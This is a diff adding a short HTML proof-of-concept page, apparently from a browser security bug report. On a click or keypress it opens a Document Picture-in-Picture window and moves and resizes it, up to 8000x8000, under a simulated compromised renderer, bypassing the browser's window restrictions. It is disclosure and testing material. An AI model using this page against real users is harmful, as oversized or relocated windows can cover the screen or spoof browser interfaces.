@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; height: 100%; width: 100%; cursor: pointer; }
+</style>
+</head>
+<body>
+<h1>PoC: Document PiP Move+Resize with compromised renderer</h1>
+<p>Click (or press any key) to run PoC.</p>
+<p>Run with simulated compromised renderer to allow using move/resize on PiP window.</p>
+<p>(Might also work with video PiP with more modifications.)</p>
+<script>
+var newWin;
+var runPoC = async () => {
+    newWin = await documentPictureInPicture.requestWindow();
+    newWin.resizeTo(800, 800);
+    newWin.moveTo(200, 200);
+    setTimeout(() => {
+        newWin.moveTo(0,0);
+        newWin.resizeTo(8000, 8000);
+    }, 2000);
+    setTimeout(() => {
+        newWin.resizeTo(400, 400);
+    }, 4000);
+    setTimeout(() => {
+        newWin.moveTo(600, 200);
+    }, 6000);
+    var newWinContent = newWin.document.createElement('div');
+    newWinContent.innerHTML = `
+<style>html { font-family: sans-serif; }</style>
+<h1>Document PiP</h1>`;
+    newWin.document.body.appendChild(newWinContent);
+}
+window.addEventListener('click', runPoC);
+window.addEventListener('keydown', runPoC);
+</script>
+</body>
+</html>
